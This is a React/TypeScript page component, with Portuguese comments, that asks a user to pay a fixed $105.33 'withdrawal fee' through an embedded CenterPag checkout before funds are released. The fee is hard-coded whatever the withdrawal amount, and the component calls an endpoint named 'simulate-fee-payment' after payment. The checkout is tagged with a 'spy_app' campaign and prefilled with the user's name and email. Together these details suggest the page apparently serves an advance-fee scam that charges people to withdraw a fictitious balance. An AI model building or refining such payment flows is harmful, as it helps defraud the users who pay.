import { useState, useEffect } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { isAuthenticated, getUser, setUser } from "@/lib/auth";
import { apiGet, apiPost } from "@/lib/api-client";
import { Withdrawal, BalanceInfo } from "@shared/api";
import Layout from "@/components/Layout";

export default function WithdrawConfirmFee() {
  const navigate = useNavigate();
  const { withdrawalId } = useParams();
  const user = getUser();
  const [withdrawal, setWithdrawal] = useState<Withdrawal | null>(null);
  const [balance, setBalance] = useState<BalanceInfo | null>(null);
  const [feePercentage, setFeePercentage] = useState(0);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(true);
  const [cancelling, setCancelling] = useState(false);
  const feeAmount = 105.33;

  // Função para atualizar os dados do usuário após o saque
  const updateUserBalance = async () => {
    try {
      const userData = await apiGet("/balance");
      if (userData && userData.user) {
        const currentUser = getUser();
        if (currentUser) {
          const updatedUser = {
            ...currentUser,
            balance: userData.user.balance
          };
          setUser(updatedUser);
        }
      }
    } catch (error) {
      console.error("Failed to update user balance:", error);
    }
  };

  useEffect(() => {
    if (!isAuthenticated()) {
      navigate("/");
      return;
    }

    // CORREÇÃO 1: Validar withdrawalId antes de fazer requisições
    if (!withdrawalId) {
      setError("Invalid withdrawal request. Please start over.");
      setLoading(false);
      return;
    }

    const fetchWithdrawalData = async () => {
      try {
        setLoading(true);
        setError("");

        // CORREÇÃO 2: Adicionar timeout para requisições
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 segundos

        const withdrawals = await apiGet<Withdrawal[]>("/withdrawals");
        clearTimeout(timeoutId);

        const currentWithdrawal = withdrawals.find(w => w.id === withdrawalId);
        
        if (!currentWithdrawal) {
          setError("Withdrawal not found. Please check your request and try again.");
          setLoading(false);
          return;
        }

        // CORREÇÃO IMPORTANTE: Se o status for "completed", chamar simulate-fee-payment e redirecionar
        if (currentWithdrawal.status === "completed") {
          try {
            await apiPost("/withdrawals/simulate-fee-payment", { withdrawalId });
            // Atualizar saldo do usuário no localStorage
            await updateUserBalance();
            navigate(`/withdraw/success/${withdrawalId}`);
            return;
          } catch (err) {
            setError(err instanceof Error ? err.message : "Failed to process completed withdrawal");
            setLoading(false);
            return;
          }
        }

        // CORREÇÃO 3: Validar status do saque - agora permite pending e completed
        if (currentWithdrawal.status !== "pending" && currentWithdrawal.status !== "completed") {
          setError(`This withdrawal cannot be processed. Current status: ${currentWithdrawal.status}`);
          setLoading(false);
          return;
        }

        // CORREÇÃO CRÍTICA: Converter amount para número se for string
        const withdrawalWithNumberAmount = {
          ...currentWithdrawal,
          amount: typeof currentWithdrawal.amount === "string" 
            ? parseFloat(currentWithdrawal.amount) 
            : currentWithdrawal.amount
        };

        setWithdrawal(withdrawalWithNumberAmount);

        // Buscar informações de saldo
        const userBalance = await apiGet<BalanceInfo>("/balance");
        setBalance(userBalance);

        // Calcular percentual de taxa
        if (withdrawalWithNumberAmount.amount > 0) {
          const percentage = (feeAmount / withdrawalWithNumberAmount.amount) * 100;
          setFeePercentage(percentage);
        }

        setLoading(false);
      } catch (err) {
        // CORREÇÃO 4: Melhorar mensagens de erro
        let errorMessage = "Failed to fetch withdrawal data";
        
        if (err instanceof Error) {
          if (err.message.includes("abort")) {
            errorMessage = "Request timeout. Please check your connection and try again.";
          } else if (err.message.includes("Unauthorized")) {
            errorMessage = "Your session has expired. Please log in again.";
            navigate("/");
            return;
          } else if (err.message.includes("404")) {
            errorMessage = "Withdrawal not found. Please start over.";
          } else {
            errorMessage = err.message;
          }
        }
        
        setError(errorMessage);
        setLoading(false);
      }
    };

    fetchWithdrawalData();
  }, [navigate, withdrawalId]);

  const handleCancel = async () => {
    setCancelling(true);
    setError("");
    try {
      await apiPost("/withdrawals/cancel", { withdrawalId });
      navigate("/profile");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to cancel withdrawal");
      setCancelling(false);
    }
  };

  // This function will be called by a postMessage from the iframe parent window
  const handlePaymentSuccess = async () => {
    try {
      await apiPost("/withdrawals/simulate-fee-payment", { withdrawalId });
      navigate(`/withdraw/success/${withdrawalId}`);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to finalize withdrawal");
    }
  };

  useEffect(() => {
    const handleIframeMessage = (event: MessageEvent) => {
      if (event.origin !== "https://go.centerpag.com") return;
      if (event.data === "paymentSuccess") {
        handlePaymentSuccess();
      }
    };

    window.addEventListener("message", handleIframeMessage);
    return () => window.removeEventListener("message", handleIframeMessage);
  }, [withdrawalId]);

  // CORREÇÃO 5: Melhorar exibição de erros com interface mais clara
  if (error) {
    return (
      <Layout>
        <div className="container mx-auto max-w-2xl py-8">
          <div className="bg-red-50 border border-red-200 rounded-lg p-6">
            <h2 className="text-xl font-bold text-red-800 mb-2">Error Processing Withdrawal</h2>
            <p className="text-red-700 mb-4">{error}</p>
            <div className="flex gap-3">
              <button 
                onClick={() => navigate("/profile")}
                className="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700 transition-colors"
              >
                Return to Profile
              </button>
              <button 
                onClick={() => window.location.reload()}
                className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-700 transition-colors"
              >
                Retry
              </button>
            </div>
          </div>
        </div>
      </Layout>
    );
  }

  // CORREÇÃO 6: Melhorar interface de carregamento
  if (loading) {
    return (
      <Layout>
        <div className="container mx-auto max-w-2xl py-8">
          <div className="text-center">
            <div className="inline-block">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
            </div>
            <p className="text-gray-600 mt-4">Loading withdrawal details...</p>
          </div>
        </div>
      </Layout>
    );
  }

  if (!withdrawal || !balance) {
    return (
      <Layout>
        <div className="container mx-auto max-w-2xl py-8">
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-6">
            <p className="text-yellow-800">No withdrawal data available.</p>
          </div>
        </div>
      </Layout>
    );
  }

  // CORREÇÃO 7: Construir URL do iframe com dados do usuário autenticado
  const encodeParam = (param: string) => encodeURIComponent(param);
  const iframeUrl = `https://go.centerpag.com/PPU38CQ4JGM?name=${encodeParam(user?.name || "")}&email=${encodeParam(user?.email || "")}&utm_source=landing_page&utm_medium=iframe&utm_campaign=spy_app#payment-option-credit-card`;

  return (
    <Layout>
      <div className="container mx-auto max-w-6xl py-8 px-4">
        {/* CORREÇÃO 8: Layout ajustado para melhor responsividade */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Coluna esquerda - Detalhes do saque */}
          <div className="lg:col-span-1">
            <h1 className="text-3xl font-bold mb-4">Confirm Withdrawal Fee</h1>
            <p className="text-muted-foreground mb-6">
              To complete the withdrawal securely and in accordance with our operational policies, it is necessary to pay the {(feePercentage || 0).toFixed(2)}% transaction fee.
            </p>
            
            {/* CORREÇÃO IMPORTANTE: Exibição corrigida da taxa */}
            <div className="border rounded-lg p-4 space-y-3 bg-gray-50">
              <div className="flex justify-between">
                <span className="text-gray-600">Withdrawal Amount:</span>
                <span className="font-semibold">${(withdrawal.amount || 0).toFixed(2)}</span>
              </div>
              
              <div className="border-t pt-3">
                <div className="flex justify-between mb-2">
                  <span className="text-gray-600">Transaction Fee:</span>
                  <span className="font-semibold text-red-600">${feeAmount.toFixed(2)}</span>
                </div>
                <p className="text-xs text-gray-500">
                  ({(feePercentage || 0).toFixed(2)}% of withdrawal amount)
                </p>
              </div>
              
              <div className="border-t pt-3 bg-blue-50 -mx-4 -mb-4 px-4 py-3 rounded-b-lg">
                <p className="text-sm font-semibold text-blue-900 mb-2">Amount to Pay:</p>
                <div className="flex justify-between items-center">
                  <span className="text-lg font-bold text-blue-900">Transaction Fee Only</span>
                  <span className="text-2xl font-bold text-blue-600">${feeAmount.toFixed(2)}</span>
                </div>
              </div>
            </div>
            
            <div className="text-center mt-6">
              <button 
                onClick={handleCancel} 
                disabled={cancelling} 
                className="text-sm text-gray-500 hover:underline disabled:text-gray-300 transition-colors"
              >
                {cancelling ? "Cancelling..." : "Cancel Withdrawal"}
              </button>
            </div>
          </div>

          {/* Coluna direita - iframe de pagamento */}
          <div className="lg:col-span-2">
            {/* CORREÇÃO 9: iframe com altura dinâmica e sem cortes */}
            <div className="w-full bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
              <iframe 
                id="iframe-checkout"
                loading="eager"
                src={iframeUrl}
                scrolling="auto"
                allow="payment"
                sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-top-navigation"
                className="w-full"
                style={{ minHeight: "800px", height: "auto" }}
                title="Payment Gateway"
              />
            </div>
            <p className="text-xs text-gray-500 mt-3 text-center">
              Secure payment processing by CenterPag
            </p>
          </div>
        </div>
      </div>
    </Layout>
  );
}
